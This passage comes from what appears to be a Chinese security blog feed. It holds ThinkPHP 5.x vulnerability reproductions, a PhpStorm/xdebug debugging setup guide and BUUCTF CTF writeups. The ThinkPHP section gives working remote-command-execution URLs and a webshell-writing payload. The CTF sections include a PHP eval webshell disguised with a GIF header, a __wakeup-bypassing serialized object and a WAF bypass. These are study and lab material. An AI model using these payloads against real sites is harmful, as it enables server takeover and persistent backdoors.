class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">protected function getFilter($filter, $default)</span><br><span class="line">&#123;</span><br><span class="line">    if (is_null($filter)) &#123;</span><br><span class="line">        $filter &#x3D; [];</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;$this-&gt;filter可控，为system</span><br><span class="line">        $filter &#x3D; $filter ?: $this-&gt;filter;</span><br><span class="line">        if (is_string($filter) &amp;&amp; false &#x3D;&#x3D;&#x3D; strpos($filter, &#39;&#x2F;&#39;)) &#123;</span><br><span class="line">            $filter &#x3D; explode(&#39;,&#39;, $filter);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $filter &#x3D; (array) $filter;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filter[] &#x3D; $default;</span><br><span class="line"></span><br><span class="line">    return $filter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里的$filter是我们可控的数据，所以$filter为payload中的system，然后$filter[]被赋值$default，$default为null，所以$filter为[‘system’,null]</p><p>至此，带着数据$data为calc，$name为Mengd@，$filter为[‘system’,null]进入最终的filterValue()函数，执行call_user_func($filter,$data)，最终触发命令执行，至此，整个利用链分析完毕。</p><h4 id="8-最终利用链："><a href="#8-最终利用链：" class="headerlink" title="8.最终利用链："></a>8.最终利用链：</h4><img src="/2021/03/02/ThinkPhp5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/image-20210413022106037.png" class title="image-20210413022106037"><h4 id="9-成功命令执行"><a href="#9-成功命令执行" class="headerlink" title="9.成功命令执行"></a>9.成功命令执行</h4><img src="/2021/03/02/ThinkPhp5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/image-20210413022445047.png" class title="image-20210413022445047">]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h2&gt;&lt;p&gt;最近开始审计thinkphp的一些漏洞，理解其原理，加深对框架工作模式的认知。由于在CTF中了解一些反序列化的基本知识以及基本原理，</summary>
      
    
    
    
    
    <category term="-Thinkphp5 -源码审计 -漏洞复现 -反序列化" scheme="http://example.com/tags/Thinkphp5-%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPhp5任意类调用漏洞</title>
    <link href="http://example.com/2021/01/25/ThinkPhp5%E4%BB%BB%E6%84%8F%E7%B1%BB%E8%B0%83%E7%94%A8%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2021/01/25/ThinkPhp5%E4%BB%BB%E6%84%8F%E7%B1%BB%E8%B0%83%E7%94%A8%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-01-25T09:19:30.000Z</published>
    <updated>2021-03-12T01:42:24.064Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-Thinkphp-V5-1"><a href="#0x01-Thinkphp-V5-1" class="headerlink" title="0x01.Thinkphp V5.1"></a>0x01.Thinkphp V5.1</h1><p>在复现漏洞前先要了解thinkphp的一些基本信息以及一切基本运行模式。</p><h4 id="1-入口文件"><a href="#1-入口文件" class="headerlink" title="1.入口文件"></a>1.入口文件</h4><p>应用程序的所有http请求都有某一个文件接受并由这个文件转发到不同的功能代码。</p><p>默认入口文件为根目录下的public/index.php</p><h4 id="2-路由"><a href="#2-路由" class="headerlink" title="2.路由"></a>2.路由</h4><p>thinkphp的访问规则类似文件路径的形式，形如</p><p><a href="http://servername/index.php%EF%BC%88%E6%88%96%E8%80%85%E5%85%B6%E5%AE%83%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E6%96%87%E4%BB%B6%EF%BC%89/%E6%A8%A1%E5%9D%97/%E6%8E%A7%E5%88%B6%E5%99%A8/%E6%93%8D%E4%BD%9C/[%E5%8F%82%E6%95%B0%E5%90%8D/%E5%8F%82%E6%95%B0%E5%80%BC...]">http://serverName/index.php（或者其它应用入口文件）/模块/控制器/操作/[参数名/参数值...]</a></p><p>比如说我发起请求</p><p><a href="http://127.0.0.1/tp5/public/index.php/index/index/hello/name/Mengd@">http://127.0.0.1/tp5/public/index.php/index/index/hello/name/Mengd@</a></p><p>serverName为127.0.0.1</p><p>入口文件为tp5/public目录下的index.php文件</p><p>那么我访问的就是在服务器127.0.0.1上的tp5框架中的index模块中的index控制器中的hello操作，hello操作需要参数name，参数name的值为Mengd@</p><img src="/2021/01/25/ThinkPhp5%E4%BB%BB%E6%84%8F%E7%B1%BB%E8%B0%83%E7%94%A8%E6%BC%8F%E6%B4%9E/image-20210301103035269.png" class title="image-20210301103035269"><p>所以我们会得到输出：hello，Mengd@</p><img src="/2021/01/25/ThinkPhp5%E4%BB%BB%E6%84%8F%E7%B1%BB%E8%B0%83%E7%94%A8%E6%BC%8F%E6%B4%9E/image-20210312091817200.png" class title="image-20210312091817200"><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02.漏洞分析"></a>0x02.漏洞分析</h1><h4 id="1-理论验证"><a href="#1-理论验证" class="headerlink" title="1.理论验证"></a>1.理论验证</h4><p>我们发现thinkphp是通过url来判断当前用户是进行的那一步操作，那么thinkphp存在的一些内置类和方法我们可不可以直接通过url来进行使用呢？</p><p>我们访问一段url：<a href="http://127.0.0.1/tp5/public/index.php/index/index/hello/name/Mengd@%E5%B9%B6%E8%BF%9B%E8%A1%8C%E8%B7%9F%E8%B8%AA%EF%BC%8C%E7%9C%8B%E4%B8%80%E4%B8%8Bthinkphp%E6%98%AF%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86url%E7%9A%84">http://127.0.0.1/tp5/public/index.php/index/index/hello/name/Mengd@并进行跟踪，看一下thinkphp是如何处理url的</a></p><img src="/2021/01/25/ThinkPhp5%E4%BB%BB%E6%84%8F%E7%B1%BB%E8%B0%83%E7%94%A8%E6%BC%8F%E6%B4%9E/image-20210301112725311.png" class title="image-20210301112725311"><p>命中断点，实例化控制器跟进controller方法</p><img src="/2021/01/25/ThinkPhp5%E4%BB%BB%E6%84%8F%E7%B1%BB%E8%B0%83%E7%94%A8%E6%BC%8F%E6%B4%9E/image-20210301112830344.png" class title="image-20210301112830344"><p>来到controller方法，跟进parseModuleAndClass方法</p><img src="/2021/01/25/ThinkPhp5%E4%BB%BB%E6%84%8F%E7%B1%BB%E8%B0%83%E7%94%A8%E6%BC%8F%E6%B4%9E/image-20210301112915909.png" class title="image-20210301112915909"><p>我们发现，当检测到$name中存在”\“的时候便会直接将$name赋值给$class，而我们发现类名都是带有命名空间的，所以这里我们就可以通过控制$name间接控制调用的类，进而达到实例化任何类的目的。</p><p>该漏洞的原理明了，就是对参数控制不严谨，导致存在任意类调用。理论成立，我们来实际操作一下。</p><h4 id="2-Payload尝试"><a href="#2-Payload尝试" class="headerlink" title="2.Payload尝试"></a>2.Payload尝试</h4><p>进行尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;tp5&#x2F;public&#x2F;index.php&#x2F;index&#x2F;think\app&#x2F;index</span><br></pre></td></tr></table></figure><p>按照之前的实验，理想状况是进入parseMoudleAndClass方法，$name的值为think\app，因为存在”\“,所以$class=think\app，就会实例化think\app模块，并且调用index方法。</p><p>可是当我们实际操作的时候变成了,我们发现浏览器将“\”自动转为了”/“，那么就导致thinkphp解读为了index模块下的think控制器的app操作，给以一个内容为index的参数导致我们实例化目标类失败。</p><img src="/2021/01/25/ThinkPhp5%E4%BB%BB%E6%84%8F%E7%B1%BB%E8%B0%83%E7%94%A8%E6%BC%8F%E6%B4%9E/F$X4C7TS%60IW$D7MH%5DX%5D9LGN.png" class title="img"><p>进入parseMoudleAndClass也可以看到这里的$name内容为think，而不是我们所希望的think\app</p><img src="/2021/01/25/ThinkPhp5%E4%BB%BB%E6%84%8F%E7%B1%BB%E8%B0%83%E7%94%A8%E6%BC%8F%E6%B4%9E/image-20210301152017558.png" class title="image-20210301152017558"><p>Why？</p><p>通过分析我们发现，以刚才那个url举例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;tp5&#x2F;public&#x2F;index.php&#x2F;index&#x2F;think\app&#x2F;index</span><br></pre></td></tr></table></figure><p>url中的关键部分（模块/控制器/操作/参数…）部分“/index/think\app/index”被保存在了环境变量PATH_INFO当中</p><img src="/2021/01/25/ThinkPhp5%E4%BB%BB%E6%84%8F%E7%B1%BB%E8%B0%83%E7%94%A8%E6%BC%8F%E6%B4%9E/image-20210301151700224.png" class title="image-20210301151700224"><p>当然这里的”\“已经被替换为了“/”。</p><p>翻阅配置文件，发现该参数可以被变量s代替进行传入。</p><img src="/2021/01/25/ThinkPhp5%E4%BB%BB%E6%84%8F%E7%B1%BB%E8%B0%83%E7%94%A8%E6%BC%8F%E6%B4%9E/image-20210301151858124.png" class title="image-20210301151858124"><p>修改url访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;tp5&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;think\app&#x2F;index</span><br></pre></td></tr></table></figure><p>成功实例化think\app模块，该处提示方法不存在是因为确实没有index()这个方法。并且由此可以看出控制器已经实例化成功。</p><img src="/2021/01/25/ThinkPhp5%E4%BB%BB%E6%84%8F%E7%B1%BB%E8%B0%83%E7%94%A8%E6%BC%8F%E6%B4%9E/image-20210301152244756.png" class title="image-20210301152244756"><p>$name的值也正常，为think\app</p><img src="/2021/01/25/ThinkPhp5%E4%BB%BB%E6%84%8F%E7%B1%BB%E8%B0%83%E7%94%A8%E6%BC%8F%E6%B4%9E/image-20210301152451397.png" class title="image-20210301152451397"><p>至此，漏洞原理验证成功，现在只需要找到thinkphp自带的模块方法进行调用就好了</p><p>来远程命令执行(验证环境WIN10&amp;KALI2019)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;tp5&#x2F;public&#x2F;?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;dir</span><br></pre></td></tr></table></figure><img src="/2021/01/25/ThinkPhp5%E4%BB%BB%E6%84%8F%E7%B1%BB%E8%B0%83%E7%94%A8%E6%BC%8F%E6%B4%9E/image-20210312093012058.png" class><p>shell写入(验证环境WIN10&amp;KALI2019)（由于网上找的都存在控制器不存在的原因，我自己找了个写shell的模块）</p><p>修改点在think\Container模块，我找到的invokefunction方法是在app模块中的，但在5.1版本invokefunction方法已经被放入Container模块了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index&#x2F;think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;file_put_contents&amp;vars[1][]&#x3D;..&#x2F;test.php&amp;vars[1][]&#x3D;&lt;?php system(&quot;ls&quot;);?&gt;（注，这里的命令执行要注意部分命令在linux和windows中的区别）</span><br></pre></td></tr></table></figure><img src="/2021/01/25/ThinkPhp5%E4%BB%BB%E6%84%8F%E7%B1%BB%E8%B0%83%E7%94%A8%E6%BC%8F%E6%B4%9E/image-20210312093705333.png" class title="image-20210312093705333"><h4 id="3-payload跟进分析"><a href="#3-payload跟进分析" class="headerlink" title="3.payload跟进分析"></a>3.payload跟进分析</h4><p>我在win10环境下选择payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;tp5&#x2F;public&#x2F;?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;dir</span><br></pre></td></tr></table></figure><p>进行跟进分析。</p><p>首先断点来到parseModuleAndClass方法</p><img src="/2021/01/25/ThinkPhp5%E4%BB%BB%E6%84%8F%E7%B1%BB%E8%B0%83%E7%94%A8%E6%BC%8F%E6%B4%9E/image-20210301155558316.png" class title="image-20210301155558316"><p>$name的值为”\think\request”</p><p>由于存在反斜杠，直接将其赋值给$class</p><p>进入controller方法，检测$class是否存在，存在直接返回$this-&gt;__get($class)</p><img src="/2021/01/25/ThinkPhp5%E4%BB%BB%E6%84%8F%E7%B1%BB%E8%B0%83%E7%94%A8%E6%BC%8F%E6%B4%9E/image-20210301194752998.png" class title="image-20210301194752998"><p>进入invokeMothod方法，通过invokeArgs方法即进入input操作</p><img src="/2021/01/25/ThinkPhp5%E4%BB%BB%E6%84%8F%E7%B1%BB%E8%B0%83%E7%94%A8%E6%BC%8F%E6%B4%9E/image-20210301200347232.png" class title="image-20210301200347232"><p>继续往下来到filterValue函数，通过call_user_func()函数执行命令，得到了我们想要的结果</p><img src="/2021/01/25/ThinkPhp5%E4%BB%BB%E6%84%8F%E7%B1%BB%E8%B0%83%E7%94%A8%E6%BC%8F%E6%B4%9E/image-20210301200727170.png" class title="image-20210301200727170">]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-Thinkphp-V5-1&quot;&gt;&lt;a href=&quot;#0x01-Thinkphp-V5-1&quot; class=&quot;headerlink&quot; title=&quot;0x01.Thinkphp V5.1&quot;&gt;&lt;/a&gt;0x01.Thinkphp V5.1&lt;/h1&gt;&lt;p&gt;在复现漏洞前</summary>
      
    
    
    
    
    <category term="Thinkphp5" scheme="http://example.com/tags/Thinkphp5/"/>
    
    <category term="源码审计" scheme="http://example.com/tags/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>配置PhpStorm+xdebug调试环境</title>
    <link href="http://example.com/2021/01/24/%E9%85%8D%E7%BD%AEPhpstorm-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83/"/>
    <id>http://example.com/2021/01/24/%E9%85%8D%E7%BD%AEPhpstorm-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83/</id>
    <published>2021-01-24T10:07:54.000Z</published>
    <updated>2021-01-28T15:54:42.666Z</updated>
    
    <content type="html"><![CDATA[<p>最近打算对一些常见的php代码进行源码审计，当然良好的调试环境也是少不了的，在配置PhpStorm+xdebug的时候踩了些坑，遂记录。</p><img src="/2021/01/24/%E9%85%8D%E7%BD%AEPhpstorm-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83/sbrNwT.png" class><h1 id="1-0：下载对应版本的XDEBUG"><a href="#1-0：下载对应版本的XDEBUG" class="headerlink" title="1.0：下载对应版本的XDEBUG"></a>1.0：下载对应版本的XDEBUG</h1><p>xdebug对php版本信息有着较高的要求，首先得通过当前php的版本信息下载对应的xdebug插件。</p><p>在本地环境查看当前phpinfo：</p><p>我们直接ctrl+a全选复制，打开<a href="https://xdebug.org/wizard">https://xdebug.org/wizard</a></p><p>[<img src="/2021/01/24/%E9%85%8D%E7%BD%AEPhpstorm-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83/sbr5pd.png" class title="sbr5pd.png">]</p><p>将所有内容粘贴到框内并且点击<strong>Analyse my phpinfo() output</strong></p><p>下载对应的xdebug，复制小标号3的zend_extension = C:\php\ext\php_xdebug-3.0.2-7.2-vc15-nts.dll（注，每个人不一样）</p><p>[<img src="/2021/01/24/%E9%85%8D%E7%BD%AEPhpstorm-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83/sbrb0f.png" class title="sbrb0f.png">]</p><h1 id="1-1：更改php-ini配置文件"><a href="#1-1：更改php-ini配置文件" class="headerlink" title="1.1：更改php.ini配置文件"></a>1.1：更改php.ini配置文件</h1><p>打开对应目录的php.ini，我这里是D:\phpStudy\PHPTutorial\php\php-7.2.1-nts\php.ini，然后将刚刚复制的加上如下对应配置即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#刚刚复制的xdebug所在路径</span><br><span class="line">zend_extension &#x3D; D:\phpStudy\PHPTutorial\php\php-7.2.1-nts\ext\php_xdebug-3.0.2-7.2-vc15-nts.dll</span><br><span class="line">xdebug.mode &#x3D; debug#xdebug模式</span><br><span class="line">xdebug.start_with_request &#x3D; yes </span><br><span class="line">xdebug.client_port &#x3D; 9100#xdebug对应监听端口，默认为9000，这里设置为9100防止冲突</span><br><span class="line">xdebug.remote_host&#x3D;127.0.0.1 </span><br><span class="line">xdebug.remote_handler&#x3D;dbgp </span><br><span class="line">xdebug.idekey&#x3D;Mengda#链接密码，这个等等在PhpStorm设置的时候要用到</span><br></pre></td></tr></table></figure><p>然后重启apache服务器，打开phpstorm</p><h1 id="1-2：对PhpStorm进行配置"><a href="#1-2：对PhpStorm进行配置" class="headerlink" title="1.2：对PhpStorm进行配置"></a>1.2：对PhpStorm进行配置</h1><p>看到对应的setting-&gt;php-&gt;Debug更改Debug port为刚刚配置文件种的端口，这里是9100</p><p>[<img src="/2021/01/24/%E9%85%8D%E7%BD%AEPhpstorm-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83/sbyuGQ.png" class title="sbyuGQ.png">]</p><p>看到对应的setting-&gt;php-&gt;Debug-&gt;DBGP Proxy更改对应的IDEKEY(配置文件中设置的Key)，HOST，Port</p><p>[<img src="/2021/01/24/%E9%85%8D%E7%BD%AEPhpstorm-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83/sbyUG4.png" class title="sbyUG4.png">]</p><p>看到对应的setting-&gt;php-&gt;Servers添加一个服务，如图所示</p><p>[<img src="/2021/01/24/%E9%85%8D%E7%BD%AEPhpstorm-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83/sbg7o6.png" class title="sbg7o6.png">]</p><p>到此就设置完毕了，有时候可能会遇到一些报错，是因为现在的xdebug是3.X版本的，网上很多教程是2.X版本的，配置ejike文件中很多的变量名都进行了更新，导致报错。所以只需要将配置文件中xdebug的参数使用3.X版本的即可。本文章中之前给的配置参数就是3.X标准的，无需修改。</p><h1 id="1-3：用法介绍"><a href="#1-3：用法介绍" class="headerlink" title="1.3：用法介绍"></a>1.3：用法介绍</h1><p>介绍一下调试按钮所对应的功能</p><p>[<img src="/2021/01/24/%E9%85%8D%E7%BD%AEPhpstorm-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83/sLohOf.png" class title="sLohOf.png">]</p><ul><li>第一个按钮：step over 步越</li></ul><p><em>执行当前函数的下一步，如果有子函数，也不会进入，会一直执行到函数结束</em></p><ul><li>第二个按钮：step into 步入</li></ul><p><em>执行当前函数的下一步，如果有子函数，会从头到尾执行子函数，还原了程序执行的最详细的路线，从构造函数到结尾的每一步都会跳到。</em></p><ul><li>第三个按钮：force step into</li></ul><p><em>与step into 相同，执行当前函数的下一步，如果有子函数也会进入子函数，只不过不会从头到尾的还原函数执行的路线，会直接跳到子函数内第一步，构造函数等一些前置方法会忽略</em></p><ul><li>第四个按钮：step out 步出</li></ul><p><em>跳出当前执行的函数，跳到父函数的下一步。</em></p><ul><li>第五个按钮：run to cursor </li></ul><p><em>执行到下一个断点处</em></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近打算对一些常见的php代码进行源码审计，当然良好的调试环境也是少不了的，在配置PhpStorm+xdebug的时候踩了些坑，遂记录。&lt;/p&gt;
&lt;img src=&quot;/2021/01/24/%E9%85%8D%E7%BD%AEPhpstorm-xdebug%E8%B0%83</summary>
      
    
    
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
    <category term="XDEBUG" scheme="http://example.com/tags/XDEBUG/"/>
    
    <category term="动态调试" scheme="http://example.com/tags/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF刷题记录</title>
    <link href="http://example.com/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://example.com/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-12-18T10:29:33.000Z</published>
    <updated>2022-01-27T11:01:36.118Z</updated>
    
    <content type="html"><![CDATA[<h2 id="护网杯-2018-WEB-easy-tornado-1"><a href="#护网杯-2018-WEB-easy-tornado-1" class="headerlink" title="护网杯 2018-WEB-easy_tornado 1"></a>护网杯 2018-WEB-easy_tornado 1</h2><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ySvoAe.png" class title="ySvoAe.png"><p>直接百度tornado 是一个基于python的web模板，那么肯定存在模板注入，flag.txt告诉我们flag所在文件</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ySvLct.png" class title="ySvLct.png"><p>hints.txt告诉我们flag文件的filehash的格式</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ySxSAg.png" class title="ySxSAg.png"><p>可以看到想要访问到/fllllllllllllag</p><p>就要让filehash等于md5(cookie_secret+md5(filename))</p><p>那么就要找到cookie_secret，考虑到这个题是模板注入，那么肯定存在某些对象指向全局变量或者指向cookie这个变量</p><p>通过百度，存在一个这样的对象handler.settings，通过它我们能访问到一些全局变量</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ySxkj0.png" class title="ySxkj0.png"><p>我们找到了cookie_secret 然后按照hint加密即可得到payload</p><p>filename=/fllllllllllllag&amp;filehash=40243a38051c62d9ae18aef649477b51</p><h2 id="RoarCTF-2019-Easy-Calc1"><a href="#RoarCTF-2019-Easy-Calc1" class="headerlink" title="[RoarCTF 2019]Easy Calc1"></a>[RoarCTF 2019]Easy Calc1</h2><p>这道题考察了php的字符串解析特性，如何利用该特性绕过waf</p><p>首先打开题目链接，发现是一个计算器，输入算式获得结果。</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ySxgUg.png" class title="ySxgUg.png"><p>查看网页源码发现存在一个waf，初步判定waf过滤了字母字符等关键字，并且发现了calc.php文件。</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ySxh2n.png" class title="ySxh2n.png"><p>访问calc.php，出现了源码，不难看出，waf对num进行过滤后再次对某些特定的字符进行了过滤。最后eval函数会运行我们的payload</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ySxTbT.png" class title="ySxTbT.png"><p>首先便是要绕过waf，这里就涉及到了php对字符串处理的一些特性，比如这里是通过?num进行传参，服务器对num这个变量进行了waf过滤，但是当我们将</p><p>?num变为? num时，就可以绕过waf的过滤，因为此时我们实际上waf认为我们传的参数是</p><p>” num”而不是”num”，绕过了waf的检测，而php在处理” num”时又会自己吧空格给去掉，所以我们就成功绕过了waf。</p><p>现在，我们可以控制num的值了，在不使用黑名单中的字符的情况下输出flag。</p><p>首先我们通过scandir()访问calc.php目录下所有的文件</p><p>payload:? num=vardump(scandir(chr(47)))</p><p>这里的chr(47)对应字符 ‘/’ 由于 ‘/’ 字符在黑名单中，所以我们通过chr()函数来绕过</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ySxq54.png" class title="ySxq54.png"><p>发现flag文件为f1agg</p><p>构造payload</p><p>? num=var_dump(file_get_contents(/f1agg))</p><p>将f1agg全部替换为chr()</p><p>var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</p><p>get flag!</p><h2 id="极客大挑战-2019-PHP1"><a href="#极客大挑战-2019-PHP1" class="headerlink" title="[极客大挑战 2019]PHP1"></a>[极客大挑战 2019]PHP1</h2><p>记一次PHP反序列化，这次反序列化学到了一点新的内容</p><p>首先发现网页源码，网页告诉我们有出题者吧网页给备份了，我们用dirsearch扫描了该网页的目录，扫到了存在源码备份文件</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ySzGzn.png" class title="ySzGzn.png"><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ypSkwT.png" class title="ypSkwT.png"><p>打开index.php 发现引入了class.php并且将接收的select参数反序列化</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ySzcsx.png" class title="ySzcsx.png"><p>进入class.php我们发现如下代码，定义了Name类的__destruct()方法，当名为Name的类被摧毁时，检查password是否为100，username是否为admin，若是，则输出flag</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ySz4Fe.png" class title="ySz4Fe.png"><p>思路就是我们需要序列化一个名为Name的类，并且这里面需要两个私有变量username=admin和password=100</p><p>构造：</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ySzIWd.png" class title="ySzIWd.png"><p>输出为：</p><p>O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;s:3:”100″;}</p><p>这个时候需要引入一些修饰符，在反序列化中，</p><p>成员属性为public修饰的不用太多的修饰原生构造就好</p><p>而private需要加**%00Name%00**，</p><p>protected则需要使用 <strong>%00*%00username</strong>这样的方式</p><p>所以这里的构造就成了,修改2为3绕过wakeup检测</p><p>O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;s:3:”100″;}</p><p>get flag!</p><h2 id="HCTF-2018-admin1"><a href="#HCTF-2018-admin1" class="headerlink" title="[HCTF 2018]admin1"></a>[HCTF 2018]admin1</h2><p><span style="color:red">这道题涉及到了基于flask的session伪造</span></p><p>打开题目，首先注册一个账号并且登录</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/yppIKI.png" class title="yppIKI.png"><p>提示我们要通过管理员登录</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/yppTqP.png" class title="yppTqP.png"><p>在这个更改密码的地方发现了hint</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/yppOPg.png" class title="yppOPg.png"><p>访问该网站我们发现了网页的源码，这是一个基于flask框架的网站。</p><p>那么如何让我们作为admin登录呢？由于flask框架是一个轻量级的web框架，对于session的存储是放在客户端的，我们能够得到session的具体值，那么只要通过session伪造，将这个session解码并且修改用户名为admin后重新加密访问该网站就可以以admin的身份登陆了。</p><p>这里用到一个工具：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flask-session-cookie-manager</span><br><span class="line">解码session需要一个key，在源码中我发现key的值为ckj123</span><br></pre></td></tr></table></figure><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/yp9Gzd.png" class title="yp9Gzd.png"><p>白色部分为我们解码的session，我们复制下来后将’name’的值更改为admin，重新用脚本加密</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/yp9aeP.png" class title="yp9aeP.png"><p>获得新的session</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/yp9wo8.png" class title="yp9wo8.png"><p>成功成为admin 获得flag</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/yp9DJg.png" class title="yp9DJg.png"><h2 id="极客大挑战-2019-Upload1"><a href="#极客大挑战-2019-Upload1" class="headerlink" title="[极客大挑战 2019]Upload1"></a>[极客大挑战 2019]Upload1</h2><p><span style="color:red">题目考点：文件上传过滤绕过</span></p><p>首先题目让我们上传图片，我真的就穿了个图片过去，发现不能上传png，jpg格式都不能上传，很奇怪。</p><p>然后我将我的一句话上传，显示错误，识别是php</p><p>然后使用phtml后缀上传发现过滤了?&gt;，所以使用新的写法写一个图片马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF98a&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&#39;Mengda&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>这样即绕过文件头检测也可以绕过?&gt;过滤</p><p>传马 getflag</p><h2 id="SUCTF-2019-CheckIn1"><a href="#SUCTF-2019-CheckIn1" class="headerlink" title="[SUCTF 2019]CheckIn1"></a>[SUCTF 2019]CheckIn1</h2><p><span 